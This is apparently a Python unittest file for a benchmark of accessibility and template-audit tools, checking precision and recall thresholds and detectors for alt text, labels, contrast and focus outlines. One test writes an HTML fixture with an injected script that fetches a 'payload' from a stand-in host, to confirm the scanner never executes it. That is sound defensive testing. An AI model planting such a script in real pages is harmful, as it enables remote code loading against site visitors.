"""Benchmark contract tests; also catch metric / labeling regressions."""
import json
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from shutil import copytree
import unittest

ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT/'scripts'))
from run_benchmark import evaluate
from run_scenario_benchmark import run
from audit_slop import audit
from audit_templates import scan_template,scan_css,wcag_contrast

def has_typescript():
    if not shutil.which('node'):
        return False
    if shutil.which('npm'):
        res=subprocess.run(['node','-e','try {require("typescript")} catch(e) {process.exit(1)}'],capture_output=True)
        if res.returncode==0:return True
        # The production AST parser also resolves npm root -g.
        root=subprocess.run(['npm','root','-g'],capture_output=True,text=True)
        if root.returncode==0 and (Path(root.stdout.strip())/'typescript').is_dir():return True
    return False

class BenchmarkTests(unittest.TestCase):
    def setUp(self):
        if self._testMethodName != 'test_five_stacks' and not has_typescript():
            self.skipTest('TypeScript ausente; benchmark AST é obrigatório no job benchmark')

    def test_five_stacks(self):
        data=json.loads((ROOT/'benchmarks/gold.json').read_text())
        self.assertEqual(len(data['cases']),10)
        self.assertEqual(len({x['path'].split('/')[0] for x in data['cases']}),5)
        self.assertEqual({x['split'] for x in data['cases']},{'development','holdout'})
        for c in data['cases']:
            self.assertEqual(len(c['expected']),len(set(c['expected'])))
            self.assertTrue((ROOT/'benchmarks/fixtures'/c['path']).is_file())

    def test_synthetic_benchmark_quality(self):
        report=evaluate(use_ast=True)
        for scope in ('development','holdout'):
            self.assertGreaterEqual(report['splits'][scope]['precision'],0.9)
            self.assertGreaterEqual(report['splits'][scope]['recall'],0.85)

    def test_product_scenario_quality(self):
        report=run()
        self.assertEqual(report['scenario_count'],5)
        self.assertTrue(report['passed'],report['results'])
        self.assertFalse(report['https_previews_verified'])
        self.assertFalse(report['external_reviewer_approved'])

    def test_benchmark_detects_mutated_negative(self):
        # Verify that a new defect in a clean holdout is scored as FP, not silently ignored.
        with tempfile.TemporaryDirectory() as folder:
            root=Path(folder)/'benchmarks'
            copytree(ROOT/'benchmarks/fixtures',root/'fixtures')
            (root/'gold.json').write_bytes((ROOT/'benchmarks/gold.json').read_bytes())
            candidate=root/'fixtures/vue/clean.vue'
            candidate.write_text(candidate.read_text().replace('</template>','<a href="#">bad</a></template>'))
            report=evaluate(root/'gold.json',use_ast=True)
            self.assertGreater(report['splits']['holdout']['fp'],0)

class DetectorTests(unittest.TestCase):
    def test_vue_script_string_not_markup(self):
        text='<script>const sample = `<img src="oops">`</script>\n<template><img src="good.png" alt="Foto"></template>'
        self.assertEqual(scan_template(text,'Component.vue'),[])

    def test_vue_label_not_placeholder(self):
        problems=scan_template('<template><input placeholder="email"></template>','Component.vue')
        self.assertIn('UNLABELED_INPUT',[x['key'] for x in problems])

    def test_astro_frontmatter_ignored(self):
        problems=scan_template('---\nconst fake=`<img src="x">`;\n---\n<img src="real.png" alt="ok">','page.astro')
        self.assertEqual(problems,[])

    def test_css_comment_excluded_and_real_contrast(self):
        code='/* .bad{color:#ddd;background-color:#fff} */ .good{color:#222;background-color:#fff}'
        self.assertEqual(scan_css(code,'app.css'),[])
        self.assertIn('LOW_STATIC_CONTRAST',[f['key'] for f in scan_css('.bad{color:#ddd;background-color:#fff}', 'app.css')])
        self.assertGreater(wcag_contrast((0,0,0),(255,255,255)),20)

    def test_focus_replacement_not_flagged(self):
        self.assertEqual(scan_css(':focus{outline:none;box-shadow:0 0 0 3px #222}','main.css'),[])
        self.assertIn('FOCUS_OUTLINE_REMOVED',[f['key'] for f in scan_css('button:focus{outline:none}','main.css')])

    def test_xss_never_executes_in_scan(self):
        with tempfile.TemporaryDirectory() as folder:
            p=Path(folder)
            dangerous=p/'index.html'
            dangerous.write_text('<script>fetch("https://example.org/payload")</script><img src="">')
            audit(p)
            self.assertEqual(list(p.iterdir()),[dangerous])

if __name__=='__main__':unittest.main()
